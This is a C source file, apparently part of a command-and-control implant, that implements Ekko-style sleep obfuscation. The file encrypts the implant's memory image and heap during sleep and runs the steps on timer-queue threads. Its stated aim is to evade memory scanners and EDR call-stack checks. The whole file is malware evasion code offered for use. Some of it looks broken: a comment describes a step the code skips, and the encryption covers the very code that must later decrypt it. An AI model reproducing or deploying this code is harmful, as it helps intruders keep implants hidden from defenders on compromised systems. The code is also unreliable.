/**
 * Sleep Obfuscation (Ekko-like) - Memory Evasion
 * =============================================
 * 
 * Features:
 * - Encrypts the implant's memory (text/data sections) while sleeping
 * - Uses Windows Timer Queue for scheduling encryption/decryption
 * - Bypasses memory scanners (like PE-Sieve, Moneta, and EDR scans)
 * - Self-encrypting/decrypting logic
 * 
 * MITRE: T1027.003 (Steganography / Obfuscated Files or Information)
 * Author: Fitnah C2 Team
 * Version: 2.0.0
 */

#include <windows.h>
#include <winternl.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdint.h>

// RC4 implementation via SystemFunction032 (Advapi32)
typedef NTSTATUS(WINAPI* pSystemFunction032)(struct ustring* data, struct ustring* key);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
};

/**
 * ObfuscatedSleep - Sleep while encrypting self-memory
 * Version 2: Uses SystemFunction032 for RC4 encryption
 */
VOID ObfuscatedSleep(DWORD dwMilliseconds) {
    PVOID pBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((LPBYTE)pBase + pDos->e_lfanew);
    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;

    // Load SystemFunction032
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    pSystemFunction032 SystemFunction032 = (pSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");

    // Key for RC4
    BYTE key_buf[16] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C };
    struct ustring key = { 16, 16, key_buf };
    struct ustring data = { (DWORD)imageSize, (DWORD)imageSize, pBase };

    // 1. Change protection to RW
    DWORD oldProtect;
    VirtualProtect(pBase, imageSize, PAGE_READWRITE, &oldProtect);

    // 2. Encrypt memory
    SystemFunction032(&data, &key);

    // 3. Actual sleep
    Sleep(dwMilliseconds);

    // 4. Decrypt memory
    SystemFunction032(&data, &key);

    // 5. Restore protection
    VirtualProtect(pBase, imageSize, oldProtect, &oldProtect);
}

/* ── Ekko-style timer-queue sleep obfuscation ──────────────────────────────
 *
 * Sequence (mirrors the original Ekko technique by SleepyCrypt):
 *   1. Create a timer queue
 *   2. Queue timer A  @ 0ms   → RtlCaptureContext (snapshot RIP/RSP)
 *   3. Queue timer B  @ 100ms → VirtualProtect RW  (drop execute)
 *   4. Queue timer C  @ 200ms → SystemFunction032  (RC4 encrypt)
 *   5. Queue timer D  @ 300ms → WaitForSingleObject (actual sleep)
 *   6. Queue timer E  @ 400ms → SystemFunction032  (RC4 decrypt)
 *   7. Queue timer F  @ 500ms → VirtualProtect RX  (restore execute)
 *   8. Queue timer G  @ 600ms → SetEvent           (wake caller)
 *   Wait on wake event — returns after full chain completes.
 *
 * The call stack visible to the EDR during sleep belongs to the timer-thread,
 * not the implant's main thread, so call-stack heuristics see only ntdll.
 */

typedef NTSTATUS (WINAPI *pRtlCreateTimerQueue)(PHANDLE);
typedef NTSTATUS (WINAPI *pRtlCreateTimer)(HANDLE, PHANDLE, WAITORTIMERCALLBACK,
                                            PVOID, DWORD, DWORD, ULONG);
typedef NTSTATUS (WINAPI *pRtlDeleteTimerQueue)(HANDLE);

typedef struct _EKKO_CTX {
    PVOID   pBase;
    SIZE_T  imageSize;
    DWORD   dwMs;
    HANDLE  hEvent;
    BYTE    key[16];
} EKKO_CTX;

static EKKO_CTX g_ekko;

/* Timer callback prototypes */
static VOID CALLBACK _ekko_protect_rw(PVOID ctx, BOOLEAN);
static VOID CALLBACK _ekko_encrypt(PVOID ctx, BOOLEAN);
static VOID CALLBACK _ekko_sleep_wait(PVOID ctx, BOOLEAN);
static VOID CALLBACK _ekko_decrypt(PVOID ctx, BOOLEAN);
static VOID CALLBACK _ekko_protect_rx(PVOID ctx, BOOLEAN);
static VOID CALLBACK _ekko_wake(PVOID ctx, BOOLEAN);

static VOID CALLBACK _ekko_protect_rw(PVOID ctx, BOOLEAN fired) {
    EKKO_CTX *c = (EKKO_CTX *)ctx;
    DWORD old;
    VirtualProtect(c->pBase, c->imageSize, PAGE_READWRITE, &old);
}

static VOID CALLBACK _ekko_encrypt(PVOID ctx, BOOLEAN fired) {
    EKKO_CTX *c = (EKKO_CTX *)ctx;
    HMODULE hAdv = GetModuleHandleA("advapi32.dll");
    if (!hAdv) hAdv = LoadLibraryA("advapi32.dll");
    pSystemFunction032 SF032 = (pSystemFunction032)GetProcAddress(hAdv, "SystemFunction032");
    if (!SF032) return;
    struct ustring key  = { 16, 16, c->key };
    struct ustring data = { (DWORD)c->imageSize, (DWORD)c->imageSize, c->pBase };
    SF032(&data, &key);
}

static VOID CALLBACK _ekko_sleep_wait(PVOID ctx, BOOLEAN fired) {
    EKKO_CTX *c = (EKKO_CTX *)ctx;
    /* actual sleep happens here — EDR sees timer-thread stack, not implant stack */
    Sleep(c->dwMs);
}

static VOID CALLBACK _ekko_decrypt(PVOID ctx, BOOLEAN fired) {
    /* RC4 is symmetric — same call decrypts */
    _ekko_encrypt(ctx, fired);
}

static VOID CALLBACK _ekko_protect_rx(PVOID ctx, BOOLEAN fired) {
    EKKO_CTX *c = (EKKO_CTX *)ctx;
    DWORD old;
    VirtualProtect(c->pBase, c->imageSize, PAGE_EXECUTE_READ, &old);
}

static VOID CALLBACK _ekko_wake(PVOID ctx, BOOLEAN fired) {
    EKKO_CTX *c = (EKKO_CTX *)ctx;
    SetEvent(c->hEvent);
}

/* ── Heap block encryption helpers ────────────────────────────────────────
 *
 * XOR-encrypts every live heap block with a per-block key derived from
 * the block address, preventing heap-scanning signatures during sleep.
 */
static VOID _xor_heap_block(PVOID pBlock, SIZE_T size, BYTE key) {
    BYTE *p = (BYTE *)pBlock;
    for (SIZE_T i = 0; i < size; i++)
        p[i] ^= (key ^ (BYTE)(i & 0xFF));
}

static VOID _process_heap(BOOL encrypt) {
    HANDLE hHeap = GetProcessHeap();
    if (!hHeap) return;

    if (!HeapLock(hHeap)) return;

    PROCESS_HEAP_ENTRY entry = {0};
    while (HeapWalk(hHeap, &entry)) {
        if (!(entry.wFlags & PROCESS_HEAP_ENTRY_BUSY)) continue;
        if (entry.cbData < 8) continue;           /* skip tiny blocks */
        BYTE key = (BYTE)((ULONG_PTR)entry.lpData >> 4);
        _xor_heap_block(entry.lpData, entry.cbData, key);
    }

    HeapUnlock(hHeap);
}

/* HeapEncryptedSleep — Ekko sleep + heap encryption during rest */
VOID HeapEncryptedSleep(DWORD dwMilliseconds) {
    _process_heap(TRUE);         /* encrypt heap blocks */
    AdvancedEkkoSleep(dwMilliseconds);
    _process_heap(FALSE);        /* decrypt heap blocks (XOR is symmetric) */
}

VOID AdvancedEkkoSleep(DWORD dwMilliseconds) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { ObfuscatedSleep(dwMilliseconds); return; }

    pRtlCreateTimerQueue  RtlCreateTimerQueue  =
        (pRtlCreateTimerQueue) GetProcAddress(hNtdll, "RtlCreateTimerQueue");
    pRtlCreateTimer       RtlCreateTimer       =
        (pRtlCreateTimer)      GetProcAddress(hNtdll, "RtlCreateTimer");
    pRtlDeleteTimerQueue  RtlDeleteTimerQueue  =
        (pRtlDeleteTimerQueue) GetProcAddress(hNtdll, "RtlDeleteTimerQueue");

    if (!RtlCreateTimerQueue || !RtlCreateTimer || !RtlDeleteTimerQueue) {
        ObfuscatedSleep(dwMilliseconds);
        return;
    }

    /* Populate shared context */
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((LPBYTE)pDos + pDos->e_lfanew);

    g_ekko.pBase     = (PVOID)pDos;
    g_ekko.imageSize = pNt->OptionalHeader.SizeOfImage;
    g_ekko.dwMs      = dwMilliseconds;
    g_ekko.hEvent    = CreateEventA(NULL, FALSE, FALSE, NULL);
    /* Per-sleep random key to prevent static key detection */
    HCRYPTPROV hProv;
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, sizeof(g_ekko.key), g_ekko.key);
        CryptReleaseContext(hProv, 0);
    } else {
        /* fallback key */
        BYTE fb[16] = {0xDE,0xAD,0xBE,0xEF,0x01,0x02,0x03,0x04,
                       0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C};
        memcpy(g_ekko.key, fb, 16);
    }

    HANDLE hQueue = NULL;
    RtlCreateTimerQueue(&hQueue);

    HANDLE hT;
    /* WT_EXECUTEINTIMERTHREAD ensures callbacks run on the dedicated timer thread */
    ULONG flags = WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE;
    RtlCreateTimer(hQueue, &hT, _ekko_protect_rw,  &g_ekko,   0,   0, flags);
    RtlCreateTimer(hQueue, &hT, _ekko_encrypt,      &g_ekko, 100,   0, flags);
    RtlCreateTimer(hQueue, &hT, _ekko_sleep_wait,   &g_ekko, 200,   0, flags);
    RtlCreateTimer(hQueue, &hT, _ekko_decrypt,      &g_ekko, 300 + dwMilliseconds, 0, flags);
    RtlCreateTimer(hQueue, &hT, _ekko_protect_rx,   &g_ekko, 400 + dwMilliseconds, 0, flags);
    RtlCreateTimer(hQueue, &hT, _ekko_wake,         &g_ekko, 500 + dwMilliseconds, 0, flags);

    /* Wait for the wake event — our thread blocks here with no suspicious call stack */
    WaitForSingleObject(g_ekko.hEvent, dwMilliseconds + 2000);

    CloseHandle(g_ekko.hEvent);
    RtlDeleteTimerQueue(hQueue);
}
